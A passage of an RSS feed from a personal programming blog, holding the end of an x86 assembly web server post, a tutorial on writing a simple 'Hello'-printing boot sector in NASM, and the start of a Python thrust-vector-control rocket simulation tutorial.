</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">r9</span>       <span style="color:#75715e"># get accepted socket fd
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">3</span>        <span style="color:#75715e"># sys_close
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># exit(0)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">60</span>       <span style="color:#75715e"># sys_exit
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>That&rsquo;s a basic web server written entirely in x86 Assembly in less than 300 lines of code. If you want to read the full code, you can check it out <a href="https://gist.github.com/namberino/0cd2dfa288cc63f18a951d8620c1b17f"><strong>here</strong></a>. I definitely had a lot of fun working on this and got to learn a lot more about Assembly and systems programming.</p>
<p>This project was done as part of the &ldquo;<em>Building a Web Server</em>&rdquo; course by <a href="https://pwn.college">pwn.college</a>.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.kernel.org/">Linux kernel source code</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions#x86-64_calling_conventions">x86-64 calling conventions</a></li>
<li><a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux syscall table</a></li>
<li><a href="https://man7.org">man7.org</a></li>
<li><a href="https://www.tortall.net/projects/yasm/manual/html/arch-x86-registers.html">x86 registers list</a></li>
<li><a href="http://microelectronics.esa.int/erc32/doc/as.pdf">GNU Assembler Manual</a></li>
<li><a href="https://developer.mozilla.org/en-US/">MDN Web Docs</a></li>
<li><a href="https://beej.us/guide/bgnet/">Beej&rsquo;s Guide to Network Programming</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>How boot sectors work</title>
            <link>https://namberino.github.io/posts/2024/06/how-boot-sectors-work/</link>
            <pubDate>Thu, 20 Jun 2024 14:20:39 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/06/how-boot-sectors-work/</guid>
            <description>&lt;p&gt;Let&amp;rsquo;s dive into the boot sector and how it works.&lt;/p&gt;
&lt;h2 id=&#34;the-bios&#34;&gt;The BIOS&lt;/h2&gt;
&lt;p&gt;The &lt;em&gt;BIOS&lt;/em&gt; is a program that the computer uses to start the computer system after it is powered on. It is the program responsible for loading and setting up the hardware and system in a computer and loading up the operating system.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;re not going to be building a BIOS because that is way out of the scope of this project. What we are going to be building is another very important program that the BIOS uses when it loads up the operating system from memory: the &lt;em&gt;boot sector&lt;/em&gt;.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Let&rsquo;s dive into the boot sector and how it works.</p>
<h2 id="the-bios">The BIOS</h2>
<p>The <em>BIOS</em> is a program that the computer uses to start the computer system after it is powered on. It is the program responsible for loading and setting up the hardware and system in a computer and loading up the operating system.</p>
<p>We&rsquo;re not going to be building a BIOS because that is way out of the scope of this project. What we are going to be building is another very important program that the BIOS uses when it loads up the operating system from memory: the <em>boot sector</em>.</p>
<h2 id="what-is-a-boot-sector">What is a boot sector?</h2>
<p>The BIOS can do many things, but 1 thing that it can&rsquo;t do is loading up the operating system from memory. So then how is the operating system loaded from memory? It is loaded up through another program called the <em>boot sector</em>.</p>
<p>Since the boot sector will be used everytime the computer starts up, it needs to be placed at a fixed, standard location. This location is the first sector in the hard disk of the computer. This program will also have to take up 512 bytes as the BIOS will try to check for the bytes <em>0xAA</em> and <em>0x55</em> in the 511 byte and 512 byte of the boot sector. These 2 bytes are the signature &ldquo;<em>magic numbers</em>&rdquo; that tells the BIOS that it should treat this program as the boot sector.</p>
<blockquote>
<p>Note: Because we&rsquo;re building an x86 OS. we need to remember that x86 is little-endian so the most significant byte will go first, then the least significant byte. You can find more information about endianess <a href="https://en.wikipedia.org/wiki/Endianness">here</a></p></blockquote>
<h2 id="the-simplest-boot-sector-in-the-world">The simplest boot sector in the world</h2>
<p>So with this knowledge, we can make this, which is the simplest boot sector that you can make:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">times</span> <span style="color:#ae81ff">510</span>-(<span style="color:#66d9ef">$-$$</span>) <span style="color:#66d9ef">db</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dw</span> <span style="color:#ae81ff">0xaa55</span>
</span></span></code></pre></div><p>Let&rsquo;s break this down:</p>
<ul>
<li>The first part of the code is just an jump to the current address location. This is effectively an infinite loop. When the boot sector is loaded in and ran, it will hit this infinite loop and won&rsquo;t do anything else.</li>
<li>The <code>$</code> represents the current address of the code in the assembly code. The <code>$$</code> represents the starting address of the current section. The <code>($-$$)</code> just calculates the difference between the current address of the executing code and the start of the code. So that <code>times</code> line just calculate how many bytes left in the 510 bytes of available space in the boot sector that are not set yet, and the <code>db 0</code> just fills those bytes with 0 bytes. We use 510 because the last 2 bytes are reserved for the magic numbers <code>0xaa55</code></li>
<li>The <code>dw 0xaa55</code> just set the last 2 bytes to the magic numbers</li>
</ul>
<p>You can compile this and emulate this boot sector using these commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nasm -f bin bootsector.asm -o bootsector.bin
</span></span><span style="display:flex;"><span>qemu-system-x86_64 bootsector.bin
</span></span></code></pre></div>
    <img src="/img/os-dev/boot-sector/bootsector-simple.png"  alt="Boot sector simple"  class="center"  style="padding: 10px"  />


<p>If you see a QEMU window similar to this one, the program should be working. So there we go, we&rsquo;ve successfully programmed a super simple boot sector.</p>
<h2 id="printing-stuff-using-the-boot-sector">Printing stuff using the boot sector</h2>
<p>Let&rsquo;s try to print some text onto the screen using the boot sector. For this, we&rsquo;ll need to use computer registers and interrupts. If you don&rsquo;t know anything about registers and interrupts, you can read about registers <a href="https://en.wikipedia.org/wiki/Processor_register">here</a> and about interrupts <a href="https://en.wikipedia.org/wiki/Interrupt">here</a>.</p>
<p>We&rsquo;ll need to set the mode to <em>tty</em> mode, this enables text printing in the video service, which allows us to print text to the screen. We can turn on <em>tty</em> mode by setting the <em>ah</em> register with the byte <code>0x0e</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ah</span>, <span style="color:#ae81ff">0x0e</span>
</span></span></code></pre></div><p>Now that we&rsquo;ve turned on <em>tty</em> mode, how do we print text to the screen? We can do that through setting the data inside register <em>al</em> and issuing an interrupt. Firstly, we&rsquo;ll need to set the register <em>al</em> with the letter that we want to print out. Because the register can only hold 1 byte, we can only set 1 letter at a time. Then we can issue an video service interrupt for printing the letter out. We&rsquo;ll use the <code>0x10</code> interrupt to do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">H</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">e</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">l</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span> <span style="color:#75715e">; l is still on al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">o</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span></code></pre></div><p>After printing, we can just program an infinite loop like before, so the full program should look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">ah</span>, <span style="color:#ae81ff">0x0e</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">H</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">e</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">l</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span> <span style="color:#75715e">; l is still on al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#66d9ef">o</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">int</span> <span style="color:#ae81ff">0x10</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">$</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">times</span> <span style="color:#ae81ff">510</span>-(<span style="color:#66d9ef">$-$$</span>) <span style="color:#66d9ef">db</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">dw</span> <span style="color:#ae81ff">0xaa55</span>
</span></span></code></pre></div><p>If we compile and emulate this program, we should get this result:</p>

    <img src="/img/os-dev/boot-sector/bootsector-print-hello.png"  alt="Boot sector print hello"  class="center"  style="padding: 10px"  />


<h2 id="wrap-up">Wrap up</h2>
<p>That was the basics of boot sector. We touched on what a boot sector is, how it works, and how to program a simple boot sector from scratch.</p>
]]></content>
        </item>
        
        <item>
            <title>Modeling a Thrust Vector Control Rocket in Python</title>
            <link>https://namberino.github.io/posts/2024/06/modeling-a-thrust-vector-control-rocket-in-python/</link>
            <pubDate>Wed, 05 Jun 2024 20:31:39 +0700</pubDate>
            
            <guid>https://namberino.github.io/posts/2024/06/modeling-a-thrust-vector-control-rocket-in-python/</guid>
            <description>&lt;p&gt;Rocketry has always been a fascinating topic for me and I&amp;rsquo;d love to get into model rocketry because it seems so interesting. Unfortunately, due to where I live, I can&amp;rsquo;t really get into it due to lack of materials, cost, and local laws. So what&amp;rsquo;s a guy to do when he wants to get into rocketry but can&amp;rsquo;t physically do it? He goes the virtual simulation route.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;ll be building a simulation for a simple thrust vector control (&lt;strong&gt;TVC&lt;/strong&gt;) rocket. This rocket will be modeled pretty accurately to life, it won&amp;rsquo;t be 100% realistic since it&amp;rsquo;s just a simulation, but it will be mostly correct. I&amp;rsquo;ll be documenting everything from start to finish so that anyone who wants to can follow along.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Rocketry has always been a fascinating topic for me and I&rsquo;d love to get into model rocketry because it seems so interesting. Unfortunately, due to where I live, I can&rsquo;t really get into it due to lack of materials, cost, and local laws. So what&rsquo;s a guy to do when he wants to get into rocketry but can&rsquo;t physically do it? He goes the virtual simulation route.</p>
<p>I&rsquo;ll be building a simulation for a simple thrust vector control (<strong>TVC</strong>) rocket. This rocket will be modeled pretty accurately to life, it won&rsquo;t be 100% realistic since it&rsquo;s just a simulation, but it will be mostly correct. I&rsquo;ll be documenting everything from start to finish so that anyone who wants to can follow along.</p>
<blockquote>
<p>Note: We won&rsquo;t be simulating anything like wind speed or air resistances because that&rsquo;s a little too complex for the scope of this project. We also won&rsquo;t be going into any PID or any control stuff. I might add these extra factors and implement some controls into this simulation in the future though.</p></blockquote>
<h2 id="measuring-the-actual-rocket">Measuring the actual rocket</h2>
<p>A really important measurement that we need in order to make our simulation is the <em>mass moment of inertia</em>. Mass moment of inertia is about the density across the rocket, this density will come to affect the inertia of the rocket and how &ldquo;resistant&rdquo; the rocket will be to change in inertia. The mass distribution also what comes into play when we need to know about the density across the rocket.</p>
<p>I&rsquo;ll explain briefly about the measurements and how they are taken. If you want a detailed explanation and demonstration, check out <a href="https://www.youtube.com/watch?v=nwgd1CV__rs">this BPS space video</a>. I took the measurements from that video as I don&rsquo;t have any way to do the measurements on an actual model rocket.</p>
<p>To calculate the mass moment of inertia, we&rsquo;ll first need the mass (in <em>kg</em>) of the rocket, so just put the rocket on the scale and you&rsquo;re good to go. Our rocket will have a mass of $0.543kg$</p>
<p>Next, we&rsquo;ll get the COM-string amount, which will be $0.3m$. And the string length measurement will be $0.65m$. This is the distance of the hang string from the center of mass.</p>
<p>Next, we&rsquo;ll need to get the moment arm measurement of the rocket. Moment arm is the distance between the attach point of the thrust vector control thruster and the center of mass of the rocket. This measurement will come in handy when we need to calculate for torque. Our moment arm value will be $0.28m$</p>
<p>Next, we&rsquo;ll need the rotation time between each oscillations, which is basically getting the average time between each oscillation. Our rotation time will be $1.603s$.</p>
<p>Again, this is just a brief explanation on what these measurements are, if you want to see how to actually measure these values, check out the BPS space video above.</p>
<p>To recap, here&rsquo;s all the measurements and constants that we need to calculate the mass moment of inertia:</p>
<ul>
<li>Rocket mass: $m = 0.543kg$</li>
<li>Gravitational constant: $g = 9.81 m / s^2$</li>
<li>Rotation time: $R_t = 1.603s$</li>
<li>Distance between center of mass and string: $d = 0.3m$</li>
<li>Length of string: $l = 0.65m$</li>
</ul>
<p>We can then plug these values into the mass moment of inertia equation:</p>
<p>$$
MMOI = \frac{m * g * R_t^2 * d^2}{4 \pi^2 * l}
$$</p>
<p>This will give us an MMOI value of $0.048kg \cdot m^2$. With this value and the moment arm value ($0.28m$), we can now build a program to simulate this rocket.</p>
<h2 id="3-degrees-of-freedom">3 Degrees of Freedom</h2>
<p>A rocket will usually have 3 degrees of freedom (<em>3DOF</em>), the pitch, the yaw, and the roll. This image (from <a href="https://en.wikipedia.org/wiki/Six_degrees_of_freedom">Wikipedia</a>) will give you a pretty nice visualization on what all these degrees are.</p>

    <img src="/img/tvc-modeling/3dof-visual.png"  alt="3DOF visualization"  class="center"  style="padding: 10px"  />


<p>A 3DOF function will help simulate the flight dynamics of the rocket by modeling motions and angles based on the forces and moments applied on it. For this rocket, since we&rsquo;re doing a 2D simulation, we&rsquo;ll need to make a 3DOF function to take into account the rotation in the vertical plane about a flat reference frame. We&rsquo;ll only need to care about the X and Z axes since we&rsquo;re going 2D so no need to worry about the Y axis.</p>
<p>We&rsquo;ll need to take in the data of the forces, moments, and mass of the rocket so as to accurately simulate its dynamics. The output will represent the information about the rocket at any time during flight.</p>
<p>Our 3DOF function will need to take in these values:</p>
<ul>
<li>The forces on the X and Z axes ($Fx$ and $Fz$)</li>
<li>The pitching moment ($My$): Represents the torque due to thrust</li>
</ul>
<p>This 3DOF function will output these values:</p>
<ul>
<li>Pitch angle ($\theta$): The angle between the body axis and the reference plane</li>
<li>Pitch angular rate ($q$): The rate of change of the pitch angle</li>
<li>Pitch angular acceleration ($dqdt$): The rate of change of the pitch angular rate</li>
<li>Position ($(x, z)$): Position coordinate of the rocket</li>
<li>Velocity ($(u, w)$): The velocity in the X and Z axis of the rocket</li>
<li>Acceleration ($(Ax, Az)$): The acceleration of the rocket</li>
</ul>
<p>This is the pitch in a rocket:</p>

    <img src="/img/tvc-modeling/rocket-pitch.png"  alt="Rocket&#39;s pitch"  class="center"  style="padding: 10px"  />


<h2 id="implementing-the-3dof-function">Implementing the 3DOF function</h2>
<p>Before we start coding, we&rsquo;re going to need to import numpy and matplotlib:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> numpy <span style="color:#66d9ef">as</span> np
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> matplotlib.pyplot <span style="color:#66d9ef">as</span> plt
</span></span></code></pre></div><p>Let&rsquo;s start implementing a 3DOF function in Python. This function needs the initial values of the rocket when it has not been launched then it will calculate the state of the rocket as the time increases and we apply thrust to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Inputs:
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- Fx: Force in the body x-direction (N)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- Fz: Force in the body z-direction (N)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- My: Pitching moment, represents torque (Nm)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- u0: Initial velocity in x (body axis)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- w0: Initial velocity in z (body axis)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- theta0: Initial pitch angle
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- q0: Initial pitch rate
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- pos0: Starting position [x, z]
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- mass: Mass of the rocket
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- inertia: Mass moment of inertia
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- g: Grativational constant
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- dt: Time step
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">- duration: Duration of simulation
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">three_dof_body_axes</span>(Fx, Fz, My, u0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, w0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, theta0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, q0<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, pos0<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0.0</span>, <span style="color:#ae81ff">0.0</span>], mass<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, inertia<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0</span>, g<span style="color:#f92672">=</span><span style="color:#ae81ff">9.81</span>, dt<span style="color:#f92672">=</span><span style="color:#ae81ff">0.01</span>, duration<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>):
</span></span></code></pre></div><p>Note that the time step represent a discrete time interval over which calculations will be performed to approximate the continuous changes in the rocket.</p>
<p>All of these values has been set to a default value which we can change later on.</p>
<p>Next, we&rsquo;ll assign these values to an internal variable so that we can operate on these values:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>pos <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array(pos0, dtype<span style="color:#f92672">=</span>float) <span style="color:#75715e"># this ensures that pos0 is a float array</span>
</span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> u0
</span></span><span style="display:flex;"><span>w <span style="color:#f92672">=</span> w0
</span></span><span style="display:flex;"><span>vel <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array([u, w]) <span style="color:#75715e"># assign velocity in X and Z axes to a single variable</span>
</span></span><span style="display:flex;"><span>theta <span style="color:#f92672">=</span> theta0
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> q0
</span></span></code></pre></div><p>While we&rsquo;re assigning these initial values, we need to also calculate the initial acceleration in the X and Z axes. The calculation is quite easy, we just grab the initial forces in the X and Z axes and divide it by mass (classic $F=ma$), but we need to make sure to subtract the gravitational constant from the acceleration in the Z axis because of gravity. Since our forces in the X and Z axes are stored in arrays (for reasons you&rsquo;ll see later on), we can just access the initial forces by getting the 0th element:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>ax <span style="color:#f92672">=</span> Fx[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">/</span> mass
</span></span><span style="display:flex;"><span>az <span style="color:#f92672">=</span> Fz[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">/</span> mass <span style="color:#f92672">-</span> g
</span></span></code></pre></div><p>Then we&rsquo;ll initialize a list to store the calculated output values. These list will hold the information of the rocket at each time interval during flight.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>theta_list <span style="color:#f92672">=</span> [theta]
</span></span><span style="display:flex;"><span>q_list <span style="color:#f92672">=</span> [q]
</span></span><span style="display:flex;"><span>dqdt_list <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>pos_list <span style="color:#f92672">=</span> [pos<span style="color:#f92672">.</span>copy()]
</span></span><span style="display:flex;"><span>velocity_list <span style="color:#f92672">=</span> [vel<span style="color:#f92672">.</span>copy()]
</span></span><span style="display:flex;"><span>acceleration_list <span style="color:#f92672">=</span> [np<span style="color:#f92672">.</span>array([ax, az])]
</span></span></code></pre></div><p>Now, here comes the fun part: the calculation algorithm. Since we&rsquo;re essentially solving some ordinary differential equations here (The equations describe how a state variable changes over time based on the current state and possible external inputs), we can use Euler&rsquo;s method to approximate the solutions to these ODEs and iteratively update the state variables in the output lists:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># time integration using Euler&#39;s method</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> np<span style="color:#f92672">.</span>arange(dt, duration <span style="color:#f92672">+</span> dt, dt): <span style="color:#75715e"># start at dt and end at &#39;duration&#39;</span>
</span></span></code></pre></div><p>We will run this from for the whole set duration of the simulation, with a time step of $dt$. Since $dt$ was set to $0.01s$, the time step will be quite small, this allows us to collect data of the rocket for each time step for the duration of the simulation, so we&rsquo;ll be calculating and storing the calculated data every $0.01s$.</p>
<p>Next, we&rsquo;ll need to calculate the instantaenous acceleration in the X and Z axes based on the forces applied on the rocket on the X and Z axes on a particular time step (by using <code>int(t/dt)</code>, we can index the $Fx$ and $Fz$ array at a the current time step $t$):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># calculate accelerations</span>
</span></span><span style="display:flex;"><span>ax <span style="color:#f92672">=</span> Fx[int(t<span style="color:#f92672">/</span>dt)] <span style="color:#f92672">/</span> mass
</span></span><span style="display:flex;"><span>az <span style="color:#f92672">=</span> Fz[int(t<span style="color:#f92672">/</span>dt)] <span style="color:#f92672">/</span> mass <span style="color:#f92672">-</span> g
</span></span></code></pre></div><p>Next, we&rsquo;ll calculate the angular acceleration or the rate of change of the pitch angular rate. This is calculated by just dividing the $My$ (the torque) with $inertia$ (the mass moment of inertia). Think of it as dividing the torque with the resistance to the change in inertia. This will give us the rate of change in pitch angular rate for the rocket:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># calculate angular acceleration</span>
</span></span><span style="display:flex;"><span>dqdt <span style="color:#f92672">=</span> My[int(t<span style="color:#f92672">/</span>dt)] <span style="color:#f92672">/</span> inertia
</span></span></code></pre></div><p>We&rsquo;ll also need to calculate the velocities in the X and Z axes along with the pitch angular rate with respect to the previous states:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># calculate velocities and pitch angular rate</span>
</span></span><span style="display:flex;"><span>u <span style="color:#f92672">+=</span> ax <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>w <span style="color:#f92672">+=</span> az <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">+=</span> dqdt <span style="color:#f92672">*</span> dt
</span></span></code></pre></div><p>By doing this, our simulation can process how the rocket&rsquo;s dynamics will evolve over time. We&rsquo;ll need to do the same thing to get the position, the pitch angle, and the instantenous velocity:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># calculate positions</span>
</span></span><span style="display:flex;"><span>pos <span style="color:#f92672">+=</span> vel <span style="color:#f92672">*</span> dt
</span></span><span style="display:flex;"><span>vel <span style="color:#f92672">=</span> np<span style="color:#f92672">.</span>array([u, w])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># calculate angle</span>
</span></span><span style="display:flex;"><span>theta <span style="color:#f92672">+=</span> q <span style="color:#f92672">*</span> dt
</span></span></code></pre></div><p>Ok, that&rsquo;s all the calculations needed to be done. Now we can store all these values in their respective list:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># store data in list</span>
</span></span><span style="display:flex;"><span>theta_list<span style="color:#f92672">.</span>append(theta)
</span></span><span style="display:flex;"><span>q_list<span style="color:#f92672">.</span>append(q)
</span></span><span style="display:flex;"><span>dqdt_list<span style="color:#f92672">.</span>append(dqdt)
</span></span><span style="display:flex;"><span>pos_list<span style="color:#f92672">.</span>append(pos<span style="color:#f92672">.</span>copy())
</span></span><span style="display:flex;"><span>velocity_list<span style="color:#f92672">.</span>append(vel<span style="color:#f92672">.</span>copy())
</span></span><span style="display:flex;"><span>acceleration_list<span style="color:#f92672">.</span>append(np<span style="color:#f92672">.</span>array([ax, az]))
</span></span></code></pre></div><p>Finally, to close up this time integration loop, we need a stopping condition for when the rocket hits the Earth plane. We can do this by just checking if the Z position value is less than or equal to 0 and check if the current time in the simulation is larger than 2. We need to set that time condition because we have to allow some time for the rocket to launch from 0:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># stop if the rocket returns to ground level</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> pos[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> t <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:  <span style="color:#75715e"># allow some time for launch</span>
